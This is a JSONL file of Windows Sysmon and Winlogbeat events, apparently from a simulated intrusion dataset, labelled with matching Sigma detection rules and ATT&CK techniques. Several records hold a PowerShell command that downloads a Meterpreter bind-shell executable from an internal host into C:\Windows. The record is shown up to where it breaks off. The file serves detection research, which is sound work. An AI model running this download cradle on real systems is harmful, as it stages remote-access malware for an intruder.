{"event": {"@timestamp": "2022-12-19T10:08:03.942Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Windows Update Agent", "code": 19, "created": "2022-12-19T10:08:05.444Z", "kind": "event", "provider": "Microsoft-Windows-WindowsUpdateClient"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Installation Successful: Windows successfully installed the following update: 9WZDNCRFJBBG-MICROSOFT.WINDOWSCAMERA", "winlog": {"activity_id": "{1ff30d06-1386-0000-8b96-f41f8613d901}", "api": "wineventlog", "channel": "System", "computer_name": "CLIENT1.breach.local", "event_data": {"serviceGuid": "{855e8a7c-ecb4-4ca3-b045-1dfa50104289}", "updateGuid": "{3d2a6cb6-baf0-4951-b278-9d001293651c}", "updateRevisionNumber": "1", "updateTitle": "9WZDNCRFJBBG-MICROSOFT.WINDOWSCAMERA"}, "event_id": 19, "keywords": ["Installation", "Success"], "opcode": "Installation", "process": {"pid": 356, "thread": {"id": 1688}}, "provider_guid": "{945a8954-c147-4acd-923f-40c45405a658}", "provider_name": "Microsoft-Windows-WindowsUpdateClient", "record_id": 895, "task": "Windows Update Agent", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 1}}, "rule": {"name": "WMI Event Subscription", "authors": ["Tom Ueltschi (@c_APT_ure)"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Exclude legitimate (vetted) use of WMI event subscription in your network"], "id": "0f06a3a5-6a09-413f-8743-e6cf35561297", "logsource": {"category": "wmi_event", "product": "windows"}, "tags": ["attack.persistence", "attack.t1546.003"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:03.942+00:00", "misuse": false}}
{"event": {"@timestamp": "2022-12-19T10:08:06.661Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "272245e2988e1e430500b852c4fb5e18", "md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.661\nProcessGuid: {4901c233-3806-63a0-5b07-000000000600}\nProcessId: 5232\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {4901c233-3806-63a0-5907-000000000600}\nParentProcessId: 5248\nParentImage: C:\\Windows\\System32\\conhost.exe\nParentCommandLine: C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh", "process": {"args": ["c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5b07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "hash": {"md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "name": "cmd.exe", "parent": {"args": ["C:\\Windows\\system32\\conhost.exe", "--headless", "--width", "80", "--height", "24", "--signal", "0x1f0", "--", "c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5907-000000000600}", "executable": "C:\\Windows\\System32\\conhost.exe", "name": "conhost.exe", "pid": 5248}, "pe": {"imphash": "272245e2988e1e430500b852c4fb5e18"}, "pid": 5232, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["8a2122e8162dbef04694b9c3e0b6cdee", "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450", "272245e2988e1e430500b852c4fb5e18"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows Command Processor", "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "Cmd.Exe", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4642, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "PowerShell Web Download", "authors": ["Florian Roth"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Scripts or tools that download files"], "id": "6e897651-f157-4d8f-aaeb-df8151488385", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.661+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:06.661Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "272245e2988e1e430500b852c4fb5e18", "md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.661\nProcessGuid: {4901c233-3806-63a0-5b07-000000000600}\nProcessId: 5232\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {4901c233-3806-63a0-5907-000000000600}\nParentProcessId: 5248\nParentImage: C:\\Windows\\System32\\conhost.exe\nParentCommandLine: C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh", "process": {"args": ["c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5b07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "hash": {"md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "name": "cmd.exe", "parent": {"args": ["C:\\Windows\\system32\\conhost.exe", "--headless", "--width", "80", "--height", "24", "--signal", "0x1f0", "--", "c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5907-000000000600}", "executable": "C:\\Windows\\System32\\conhost.exe", "name": "conhost.exe", "pid": 5248}, "pe": {"imphash": "272245e2988e1e430500b852c4fb5e18"}, "pid": 5232, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["8a2122e8162dbef04694b9c3e0b6cdee", "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450", "272245e2988e1e430500b852c4fb5e18"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows Command Processor", "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "Cmd.Exe", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4642, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "Windows Suspicious Use Of Web Request in CommandLine", "authors": ["James Pemberton / @4A616D6573"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."], "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/", "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"], "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.661+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:06.661Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "272245e2988e1e430500b852c4fb5e18", "md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.661\nProcessGuid: {4901c233-3806-63a0-5b07-000000000600}\nProcessId: 5232\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {4901c233-3806-63a0-5907-000000000600}\nParentProcessId: 5248\nParentImage: C:\\Windows\\System32\\conhost.exe\nParentCommandLine: C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh", "process": {"args": ["c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5b07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "hash": {"md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "name": "cmd.exe", "parent": {"args": ["C:\\Windows\\system32\\conhost.exe", "--headless", "--width", "80", "--height", "24", "--signal", "0x1f0", "--", "c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5907-000000000600}", "executable": "C:\\Windows\\System32\\conhost.exe", "name": "conhost.exe", "pid": 5248}, "pe": {"imphash": "272245e2988e1e430500b852c4fb5e18"}, "pid": 5232, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["8a2122e8162dbef04694b9c3e0b6cdee", "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450", "272245e2988e1e430500b852c4fb5e18"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows Command Processor", "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "Cmd.Exe", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4642, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "Conhost Parent Process Executions", "authors": ["omkar72"], "level": "medium", "source": "sigma", "status": "experimental", "falsepositives": ["Unlikely, conhost is a child less process"], "id": "7dc2dedd-7603-461a-bc13-15803d132355", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/"], "tags": ["attack.defense_evasion", "attack.t1202"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.661+00:00", "misuse": true, "mitreattack": {"Execution": ["t1059.001"], "Defense Evasion": ["t1202"]}, "comment": "Powershell / Indirect Command Execution"}}
{"event": {"@timestamp": "2022-12-19T10:08:06.661Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "272245e2988e1e430500b852c4fb5e18", "md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.661\nProcessGuid: {4901c233-3806-63a0-5b07-000000000600}\nProcessId: 5232\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {4901c233-3806-63a0-6bfb-e10000000000}\nLogonId: 0xE1FB6B\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {4901c233-3806-63a0-5907-000000000600}\nParentProcessId: 5248\nParentImage: C:\\Windows\\System32\\conhost.exe\nParentCommandLine: C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh", "process": {"args": ["c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5b07-000000000600}", "executable": "C:\\Windows\\System32\\cmd.exe", "hash": {"md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "name": "cmd.exe", "parent": {"args": ["C:\\Windows\\system32\\conhost.exe", "--headless", "--width", "80", "--height", "24", "--signal", "0x1f0", "--", "c:\\windows\\system32\\cmd.exe", "/c", "cmd", "/C", "powershell", "-Command", "$c", "=", "new-object", "System.Net.WebClient;", "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",", "\"C:\\Windows\\meterpreter_bind_tcp.exe\")", "&&", "echo", "File", "downloaded", "successfully."], "command_line": "C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.", "entity_id": "{4901c233-3806-63a0-5907-000000000600}", "executable": "C:\\Windows\\System32\\conhost.exe", "name": "conhost.exe", "pid": 5248}, "pe": {"imphash": "272245e2988e1e430500b852c4fb5e18"}, "pid": 5232, "working_directory": "C:\\Users\\ssh\\"}, "related": {"hash": ["8a2122e8162dbef04694b9c3e0b6cdee", "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450", "272245e2988e1e430500b852c4fb5e18"], "user": "ssh"}, "user": {"domain": "CLIENT1", "name": "ssh"}, "winlog": {"api": "wineventlog", "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "CLIENT1.breach.local", "event_data": {"Company": "Microsoft Corporation", "Description": "Windows Command Processor", "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)", "IntegrityLevel": "High", "LogonGuid": "{4901c233-3806-63a0-6bfb-e10000000000}", "LogonId": "0xe1fb6b", "OriginalFileName": "Cmd.Exe", "ParentUser": "CLIENT1\\ssh", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "RuleName": "-", "TerminalSessionId": "0"}, "event_id": 1, "opcode": "Info", "process": {"pid": 2072, "thread": {"id": 2684}}, "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "provider_name": "Microsoft-Windows-Sysmon", "record_id": 4642, "task": "Process Create (rule: ProcessCreate)", "user": {"domain": "NT AUTHORITY", "identifier": "S-1-5-18", "name": "SYSTEM", "type": "User"}, "version": 5}}, "rule": {"name": "PowerShell DownloadFile", "authors": ["Florian Roth"], "level": "high", "source": "sigma", "status": "experimental", "falsepositives": ["Unknown"], "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5", "logsource": {"category": "process_creation", "product": "windows"}, "references": ["https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"], "tags": ["attack.execution", "attack.t1059.001", "attack.command_and_control", "attack.t1104", "attack.t1105"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:06.661+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:06.676Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Process Create (rule: ProcessCreate)", "category": ["process"], "code": 1, "created": "2022-12-19T10:08:07.304Z", "kind": "event", "module": "sysmon", "provider": "Microsoft-Windows-Sysmon", "type": ["start", "process_start"]}, "hash": {"imphash": "272245e2988e1e430500b852c4fb5e18", "md5": "8a2122e8162dbef04694b9c3e0b6cdee", "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "information"}, "message": "Process Create:\nRuleName: -\nUtcTime: 2022-12-19 10:08:06.676\nProcessGuid: {4901c233-3806-63a0-5c07-000000000600}\nProcessId: 6024\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: 